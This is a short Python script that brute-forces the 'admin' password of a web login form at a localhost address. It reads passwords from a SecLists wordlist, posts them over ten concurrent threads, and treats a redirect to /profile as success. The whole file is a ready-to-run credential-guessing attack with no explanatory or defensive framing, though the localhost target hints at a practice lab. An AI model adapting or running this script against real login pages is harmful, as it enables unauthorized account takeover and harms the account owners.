from concurrent.futures import ThreadPoolExecutor as PoolExecutor
from os.path import expanduser
import requests


def is_password_valid(password):
    sess = requests.Session()
    data = {
        'login': 'admin',
        'password': password
    }
    resp = sess.post('http://127.0.0.1/login', data=data, allow_redirects=False)
    if resp.next.url == 'http://127.0.0.1/profile':
        return True, password
    return False, password
    

if __name__ == '__main__':
    with open(expanduser('~/wordlists/SecLists/Passwords/xato-net-10-million-passwords-100.txt'), 'r') as infile:
        passwords = infile.read().split('\n')[:-1]

    # print(passwords)

    with PoolExecutor(max_workers=10) as executor:
        for result, password in executor.map(is_password_valid, passwords):
            if result:
                print('Found valid password:', password)
